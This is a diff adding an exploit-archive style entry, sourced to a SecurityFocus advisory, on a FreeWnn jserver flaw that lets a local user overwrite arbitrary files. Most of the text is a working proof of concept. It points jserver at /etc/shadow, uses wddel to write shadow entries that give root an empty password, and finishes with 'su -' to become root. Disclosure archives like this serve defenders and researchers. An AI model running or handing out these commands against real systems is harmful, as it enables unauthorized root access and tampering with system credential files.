@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/7918/info
+
+A vulnerability has been reported for FreeWnn that may result in an attacker obtaining elevated privileges.
+
+It has been reported that jserver may allow an attacker to corrupt arbitrary files. Due to this, an attacker may be able to overwrite system files, and potentially gain elevated privileges. 
+
+$>/usr/bin/Wnn4/jserver -s /etc/shadow
+$>/usr/bin/Wnn4/wddel -D localhost -n '
+> root::12146:0:99999:7:::
+> bin:*:12146:0:99999:7:::
+> daemon:*:12146:0:99999:7:::
+> adm:*:12146:0:99999:7:::
+> lp:*:12146:0:99999:7:::
+> sync:*:12146:0:99999:7:::
+> shutdown:*:12146:0:99999:7:::
+> halt:*:12146:0:99999:7:::
+> ' -d 123
+$>su - 
